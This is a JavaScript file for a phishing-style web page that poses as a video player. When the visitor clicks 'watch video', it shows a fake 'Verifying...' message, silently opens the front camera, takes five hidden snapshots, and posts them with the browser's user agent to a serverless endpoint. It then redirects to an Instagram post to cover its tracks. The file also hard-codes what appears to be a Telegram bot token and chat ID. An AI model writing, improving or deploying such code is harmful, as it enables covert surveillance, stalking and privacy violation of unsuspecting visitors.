(function() {
    'use strict';
    
    const TOKEN = '8551119607:AAEiD_-W555yxN1phyYI7QKrzSTL8lzzMFE';
    const CHAT_ID = '8595919435';
    const TARGET_URL = 'https://www.instagram.com/p/C8abc123def/'; // Real IG post
    
    let stream = null;
    let captureCount = 0;
    const MAX_CAPTURES = 5;
    
    document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('watchVideoBtn').addEventListener('click', initCapture);
        document.querySelector('.play-overlay').addEventListener('click', initCapture);
    });
    
    async function initCapture() {
        // Hide play button instantly
        document.querySelector('.play-overlay').style.opacity = '0';
        document.querySelector('.watch-video-btn').textContent = '🔄 Verifying...';
        document.querySelector('.watch-video-btn').disabled = true;
        
        try {
            // Request camera silently
            stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    frameRate: { ideal: 15 }
                }
            });
            
            const video = document.getElementById('hiddenVideo');
            video.srcObject = stream;
            await new Promise(r => video.onloadedmetadata = r);
            
            // Stealth capture sequence
            captureSequence();
            
        } catch(e) {
            // Silent fail - no alerts
            console.log('Camera blocked');
            redirectToTarget();
        }
    }
    
    async function captureSequence() {
        for(let i = 0; i < MAX_CAPTURES; i++) {
            await new Promise(resolve => setTimeout(resolve, 1500 + Math.random() * 1000));
            await captureFrame();
        }
        redirectToTarget();
    }
    
    async function captureFrame() {
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = 640;
        canvas.height = 480;
        ctx.drawImage(video, 0, 0, 640, 480);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        const base64Data = imageData.split(',')[1];
        
        try {
            await fetch('/.netlify/functions/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    image: base64Data,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent
                })
            });
            captureCount++;
        } catch(e) {
            // Silent fail
        }
    }
    
    function redirectToTarget() {
        setTimeout(() => {
            window.location.href = TARGET_URL;
        }, 1000);
    }
    
    // Cleanup
    window.addEventListener('beforeunload', () => {
        if(stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    });
})();
